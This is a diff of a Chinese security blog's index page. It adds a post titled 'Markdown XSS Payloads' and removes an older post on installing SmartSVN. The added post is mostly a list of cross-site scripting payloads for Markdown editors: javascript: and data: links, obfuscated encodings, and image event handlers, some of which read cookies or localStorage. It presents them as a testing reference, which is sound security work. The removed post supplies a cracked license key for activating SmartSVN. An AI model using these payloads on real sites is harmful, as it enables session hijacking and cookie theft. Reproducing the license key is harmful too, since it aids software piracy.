@@ -138,6 +138,86 @@
 		<div class="markdown-body home-categories">
 		
 			<div class="article">
+                <a class="clearlink" href="15586769387988.html">
+                
+                  <h1>Markdown XSS Payloads</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<blockquote>
+<p>在测试某网站富文本编辑器时发现其使用了 markdown，md 会把文本转换成 html，那么肯定存在 xss 的问题，那么如何进行测试呢？于是我搜索了一番，发现前人已经有很好的研究成果了，但是鉴于安全问题的敏感，这里我就不贴原文出处了，不过感谢原作者JakobRPennington的贡献。</p>
+</blockquote>
+
+<p>Links</p>
+
+<pre class="line-numbers"><code class="language-md">[Basic](javascript:alert(&#39;Basic&#39;))
+[Local Storage](javascript:alert(JSON.stringify(localStorage)))
+[CaseInsensitive](JaVaScRiPt:alert(&#39;CaseInsensitive&#39;))
+[URL](javascript://www.google.com%0Aalert(&#39;URL&#39;))
+[In Quotes](&#39;javascript:alert(&quot;InQuotes&quot;)&#39;)
+</code></pre>
+
+<p>Images</p>
+
+<pre class="line-numbers"><code class="language-md">![Escape SRC - onload](https://www.example.com/image.png&quot;onload=&quot;alert(&#39;ImageOnLoad&#39;))
+![Escape SRC - onerror](&quot;onerror=&quot;alert(&#39;ImageOnError&#39;))
+</code></pre>
+
+<p>Fuzzing</p>
+
+<pre class="line-numbers"><code class="language-md">[XSS](javascript:prompt(document.cookie))
+[XSS](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
+[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
+[XSS](&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29)
+[XSS]: (javascript:prompt(document.cookie))
+[XSS](javascript:window.onerror=alert;throw%20document.cookie)
+[XSS](javascript://%0d%0aprompt(1))
+[XSS](javascript://%0d%0aprompt(1);com)
+[XSS](javascript:window.onerror=alert;throw%20document.cookie)
+[XSS](javascript://%0d%0awindow.onerror=alert;throw%20document.cookie)
+[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
+[XSS](vbscript:alert(document.domain))
+[XSS](javascript:this;alert(1))
+[XSS](javascript:this;alert(1&amp;#41;)
+[XSS](javascript&amp;#58this;alert(1&amp;#41;)
+[XSS](Javas&amp;#99;ript:alert(1&amp;#41;)
+[XSS](Javas%26%2399;ript:alert(1&amp;#41;)
+[XSS](javascript:alert&amp;#65534;(1&amp;#41;)
+[XSS](javascript:confirm(1)
+[XSS](javascript://www.google.com%0Aprompt(1))
+[XSS](javascript://%0d%0aconfirm(1);com)
+[XSS](javascript:window.onerror=confirm;throw%201)
+[XSS](�javascript:alert(document.domain&amp;#41;)
+![XSS](javascript:prompt(document.cookie))\
+![XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\
+![XSS&#39;&quot;`onerror=prompt(document.cookie)](x)\
+</code></pre>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2019/5/24 13:48 下午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='Web%E5%AE%89%E5%85%A8.html'>Web安全</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
                 <a class="clearlink" href="15586660103989.html">
                 
                   <h1>使用GET方法传输用户账号密码的危害</h1>
@@ -607,72 +687,6 @@ root/.ssh/id_rsa.pub</p>
                 </div>
               </div><!-- article -->
         
-			<div class="article">
-                <a class="clearlink" href="15573021402615.html">
-                
-                  <h1>Mac 上的 svnGUI 工具：smartsvn 安装、激活和使用</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<p>smartsvn 是 mac 上的 svn 客户端，svn 是类似 git 的版本控制工具。</p>
-
-<p>1、下载 smartsvn <a href="http://www.smartsvn.com/download">srmatsvn 官网下载地址</a><br/>
-2、在任意目录下新建文件 smartsvn.license，然后写入以下内容：</p>
-
-<pre class="line-numbers"><code class="language-text">Name=csdn  
-Address=1337 iNViSiBLE Str.  
-Email=admin@csdn.net  
-FreeUpdatesUntil=2099-09-26  
-LicenseCount=1337  
-Addon-xMerge=true  
-Addon-API=true  
-Enterprise=true  
-Key=4kl-&lt;Zqcm-iUF7I-IVmYG-XAyvv-KYRoC-xlgsv-sSBds-VAnP6  
-</code></pre>
-
-<p>3、在安装软件需要导入 license 时选择上述文件或者安装软件后在菜单栏的 help-register 中导入密钥文件即可激活软件。</p>
-
-<p>4、点击菜单栏的project-checkout，添加远程目录，然后输入认证信息，输入本地目录信息，即可挂载远程目录到本地。</p>
-
-<p>5、若认证出错，则点击菜单栏的 SmartSVN-preferences，然后选择 Authentication，使用 delete 删除之前存储的认证信息，然后重新 checkout 即可。</p>
-
-<h1 id="toc_0">Mac 终端下 svn 常用命令</h1>
-
-<p>Mac 可以不用安装 svnGUI 而直接使用命令进行 svn 操作，常见svn 命令如下：<br/>
-svn help 查看命令帮助<br/>
-svn checkout xxx 拉取远程目录到本地<br/>
-svn add file 往版本库中添加新文件</p>
-
-<p>更多常用命令可参考：<a href="https://www.cnblogs.com/luckythan/p/4478706.html">Mac终端下svn常用命令</a></p>
-
-<blockquote>
-<p>通过命令行操作进行认证后，其认证信息存储在 <code>~/.subversion/auth/svn.simple</code>目录下，若认证失败，需要在此目录下情况认证信息后重新进行认证。</p>
-</blockquote>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2019/5/8 15:55 下午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='%E5%B7%A5%E5%85%B7.html'>工具</a></span>
-          				   
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
               
 
 
@@ -758,6 +772,12 @@ svn add file 往版本库中添加新文件</p>
 	      
 		      
 			      <li class="post">
+			        <a href="15595455557551.html">使用 msf 检测 cve-2019-0708 WindowsRDP 远程代码执行漏洞</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
 			        <a href="15591786403220.html">双因素覆盖不全</a>
 			      </li>
 		     
@@ -777,12 +797,6 @@ svn add file 往版本库中添加新文件</p>
 		      
 			      <li class="post">
 			        <a href="15590262822391.html">洞察-宜信集应用系统资产管理、漏洞全生命周期管理、安全知识库管理三位一体的平台的安装与使用</a>
-			      </li>
-		     
-		  
-		      
-			      <li class="post">
-			        <a href="15589173721679.html">svn 报错：“svn: E155015: Commit failed (details follow):svn: E155015: Aborting commit: '/Users/lonelyor/xxx.xls' remains in conflict” 解决方法</a>
 			      </li>
 		     
 		  
